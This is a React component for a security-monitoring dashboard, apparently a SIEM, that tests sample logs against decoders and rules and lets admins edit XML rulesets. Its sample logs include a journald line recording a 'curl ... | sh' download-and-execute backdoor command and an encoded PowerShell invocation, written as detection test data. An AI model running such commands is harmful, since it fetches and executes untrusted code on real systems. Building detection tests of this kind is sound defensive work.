import React, { useEffect, useState } from 'react';
import { ArrowRight, Code2, Save } from 'lucide-react';
import { apiFetch } from '../lib/api';
import type { RbacRole } from '../types/aegis';
import { SeverityLabel, VChip } from './SeverityTag';

interface RulesetFile {
  id: string;
  path: string;
  kind: 'decoder' | 'rule';
  editable: boolean;
  content: string;
}

const SAMPLE_LOGS = [
  {
    label: 'SSHD Failed Login',
    log: '2026-11-20T02:41:10Z web-gw-01 sshd[4401]: Failed password for invalid user oracle from 185.220.101.42 port 49120 ssh2',
  },
  {
    label: 'Sibling KV (Order A)',
    log: '2026-11-20T09:15:00Z web-gw-01 aegis-session[3312]: srcuser="Bob" action="called" dstuser="Alice" srcip="10.10.1.10"',
  },
  {
    label: 'Sibling KV (Order B)',
    log: '2026-11-20T09:16:00Z web-gw-01 aegis-session[3318]: action="logged on" srcuser="Bob"',
  },
  {
    label: 'Systemd Journald JSON',
    log: '{"_HOSTNAME":"docker-app-02","SYSLOG_IDENTIFIER":"systemd-journald","_SYSTEMD_UNIT":"backdoor-sync.service","SYSLOG_PID":7742,"MESSAGE":"Started /tmp/backdoor-sync.sh via curl http://45.141.87.19/p.sh | sh"}',
  },
  {
    label: 'Windows Sysmon Event 1',
    log: '{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"win-finance-04","EventID":1,"User":"CORP\\\\a.sharma","Image":"powershell.exe","CommandLine":"powershell.exe -EncodedCommand SQBFAFgA"}',
  },
  {
    label: 'Local Decoder (Campus VPN)',
    log: '2026-11-20T10:02:11Z auth-sso-01 campus-vpn[991]: user=kushagra.sen srcip=203.0.113.55 tunnel=wireguard status=DENIED',
  },
];

export function SandboxRulesView({ role }: { role: RbacRole }) {
  const [rawLog, setRawLog] = useState(SAMPLE_LOGS[0].log);
  const [testResult, setTestResult] = useState<any>(null);
  const [testing, setTesting] = useState(false);

  const [files, setFiles] = useState<RulesetFile[]>([]);
  const [activeFileId, setActiveFileId] = useState<string>('local-decoders');
  const [editorText, setEditorText] = useState('');
  const [saveMsg, setSaveMsg] = useState<string | null>(null);
  const [err, setErr] = useState<string | null>(null);

  const loadRulesets = async () => {
    const res = await apiFetch<{ files: RulesetFile[] }>('/api/v1/rulesets');
    setFiles(res.files);
    const current = res.files.find((f) => f.id === activeFileId) || res.files[0];
    if (current) {
      setActiveFileId(current.id);
      setEditorText(current.content);
    }
  };

  useEffect(() => {
    loadRulesets();
  }, []);

  const runSandboxTest = async (logStr = rawLog) => {
    setTesting(true);
    setErr(null);
    try {
      const res = await apiFetch('/api/v1/sandbox/test', {
        method: 'POST',
        body: JSON.stringify({ rawLog: logStr }),
      });
      setTestResult(res);
    } catch (e) {
      setErr(e instanceof Error ? e.message : 'Test failed');
    } finally {
      setTesting(false);
    }
  };

  const handleSaveFile = async () => {
    setErr(null);
    setSaveMsg(null);
    try {
      const res = await apiFetch<{ decodersCount: number; rulesCount: number }>(
        `/api/v1/rulesets/${activeFileId}`,
        {
          method: 'PUT',
          body: JSON.stringify({ content: editorText }),
        }
      );
      setSaveMsg(`Saved & hot-reloaded (${res.decodersCount} decoders, ${res.rulesCount} rules active).`);
      await loadRulesets();
    } catch (e) {
      setErr(e instanceof Error ? e.message : 'Failed to save XML');
    }
  };

  const activeFile = files.find((f) => f.id === activeFileId);

  return (
    <div className="space-y-6">
      <section className="obsidian-card p-6 md:p-8 space-y-5">
        <div>
          <h2 className="headline-editorial text-2xl sm:text-3xl text-white">
            Two-Phase Decoder &amp; 0–16 Rule Test Sandbox
          </h2>
          <p className="text-xs font-mono text-gray-400 mt-1.5">
            Dry-run any syslog, journald JSON, Sysmon, or sibling key-value line through Phase 1 pre-decoding, Phase 2 parent/child/sibling extraction, and deterministic rule scoring.
          </p>
        </div>

        <div className="flex flex-wrap gap-2">
          {SAMPLE_LOGS.map((s) => (
            <button
              key={s.label}
              onClick={() => {
                setRawLog(s.log);
                runSandboxTest(s.log);
              }}
              className="btn-pill-glass px-3.5 py-1.5 text-xs font-mono whitespace-nowrap"
            >
              {s.label}
            </button>
          ))}
        </div>

        <div className="flex flex-col sm:flex-row gap-3">
          <textarea
            rows={2}
            value={rawLog}
            onChange={(e) => setRawLog(e.target.value)}
            className="flex-1 p-3.5 rounded-2xl bg-[#050505] border border-white/10 focus:border-[#FF4500] text-xs font-mono text-white focus:outline-none"
          />
          <button
            onClick={() => runSandboxTest()}
            disabled={testing}
            className="btn-pill-primary inline-flex items-center justify-center gap-1.5 px-6 py-3 text-xs whitespace-nowrap shrink-0 self-start sm:self-center"
          >
            <span>{testing ? 'Evaluating...' : 'Evaluate Log'}</span>
            <ArrowRight className="w-3.5 h-3.5" />
          </button>
        </div>

        {testResult && (
          <div className="grid grid-cols-1 md:grid-cols-3 rounded-2xl overflow-hidden border border-white/10 divide-y md:divide-y-0 md:divide-x divide-white/10 bg-[#050505]">
            <div className="p-5 space-y-2.5">
              <VChip status="info" label="PHASE 1: PRE-DECODING" />
              <div className="text-xs font-mono space-y-1 text-gray-200">
                <div>format: {testResult.trace.phase1.format}</div>
                <div>hostname: {testResult.trace.phase1.hostname}</div>
                <div>program_name: {testResult.trace.phase1.programName}</div>
                <div className="text-gray-400 break-all">body: {testResult.trace.phase1.logBody}</div>
              </div>
            </div>

            <div className="p-5 space-y-2.5">
              <VChip status="pass" label="PHASE 2: PARENT / SIBLING" />
              <div className="text-xs font-mono space-y-1 text-gray-200">
                <div>parent: {testResult.trace.phase2.parentDecoder || 'none'}</div>
                <div>effective: {testResult.trace.phase2.effectiveDecoderName}</div>
                <div>sibling_mode: {String(testResult.trace.phase2.siblingApplied)}</div>
                <pre className="mt-2 p-2.5 rounded-xl bg-[#111111] border border-white/10 text-[11px] text-[#ffe0e0] overflow-x-auto">
                  {JSON.stringify(testResult.trace.phase2.extractedFields, null, 2)}
                </pre>
              </div>
            </div>

            <div className="p-5 space-y-2.5">
              <VChip status="warn" label="PHASE 3: RULE & ML" />
              <div className="text-xs space-y-2 text-gray-200">
                <div className="flex items-center gap-2 font-mono">
                  <span>Rule #{testResult.rule.id}</span>
                  <SeverityLabel level={testResult.rule.level} />
                </div>
                <div>{testResult.rule.description}</div>
                {testResult.rule.mitre && (
                  <div className="font-mono text-[#FF4500]">
                    MITRE: {testResult.rule.mitre.id} ({testResult.rule.mitre.tactic})
                  </div>
                )}
                <div className="font-mono text-gray-400">
                  ML Score: {testResult.ml.score.toFixed(3)} ({testResult.ml.isAnomaly ? 'ANOMALY' : 'NOMINAL'})
                </div>
              </div>
            </div>
          </div>
        )}
      </section>

      <section className="obsidian-card overflow-hidden">
        <div className="px-6 py-4 border-b border-white/10 flex flex-wrap items-center justify-between gap-3">
          <div className="flex items-center gap-2.5">
            <Code2 className="w-4 h-4 text-[#FF4500]" />
            <h3 className="font-serif-display text-lg font-medium text-white">XML Ruleset &amp; Decoder Repository</h3>
          </div>
          <div className="flex flex-wrap items-center gap-1.5">
            {files.map((f) => (
              <button
                key={f.id}
                onClick={() => {
                  setActiveFileId(f.id);
                  setEditorText(f.content);
                  setSaveMsg(null);
                  setErr(null);
                }}
                className={`px-3.5 py-1.5 text-xs font-mono rounded-full border transition-colors ${
                  activeFileId === f.id
                    ? 'bg-white text-[#050505] border-white font-medium'
                    : 'bg-[#050505] border-white/10 text-gray-400 hover:text-white'
                }`}
              >
                {f.path}
              </button>
            ))}
          </div>
        </div>

        <div className="p-6 space-y-4">
          {err && (
            <div className="p-3.5 rounded-2xl bg-[#FF4500]/10 border border-[#FF4500]/40 text-xs font-mono text-[#ffe0e0]">
              {err}
            </div>
          )}
          {saveMsg && (
            <div className="p-3.5 rounded-2xl bg-emerald-500/10 border border-emerald-400/50 text-xs font-mono text-emerald-300">
              {saveMsg}
            </div>
          )}

          <textarea
            rows={16}
            value={editorText}
            readOnly={!activeFile?.editable || role !== 'admin'}
            onChange={(e) => setEditorText(e.target.value)}
            className="w-full p-4 rounded-2xl bg-[#050505] border border-white/10 text-xs font-mono text-gray-200 focus:outline-none focus:border-[#FF4500] leading-relaxed"
          />

          <div className="flex flex-wrap items-center justify-between gap-3 text-xs font-mono text-gray-400">
            <span>
              {activeFile?.editable
                ? 'Upgrade-safe local override file (Admin required to save & hot-reload).'
                : 'Built-in baseline ruleset (read-only). Override rules in etc/decoders/local_decoders.xml or etc/rules/local_rules.xml.'}
            </span>
            {activeFile?.editable && (
              <button
                onClick={handleSaveFile}
                disabled={role !== 'admin'}
                className="btn-pill-primary inline-flex items-center gap-1.5 px-5 py-2 text-xs disabled:opacity-40 whitespace-nowrap"
              >
                <Save className="w-3.5 h-3.5" />
                <span>Save &amp; Hot-Reload</span>
              </button>
            )}
          </div>
        </div>
      </section>
    </div>
  );
}
